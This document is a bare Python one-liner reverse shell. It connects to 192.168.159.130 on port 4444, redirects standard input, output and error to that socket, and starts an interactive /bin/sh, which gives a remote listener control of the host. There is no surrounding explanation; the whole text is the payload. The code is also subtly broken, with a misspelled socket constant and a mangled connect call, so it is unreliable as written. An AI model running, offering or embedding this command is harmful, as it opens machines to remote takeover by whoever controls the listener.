python -c 'import socket,subprocess,os; 
s=socket.socket(socket.AF_INET,socket.SOCKET_STREAM);
s=connect(("192.168.159.130",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
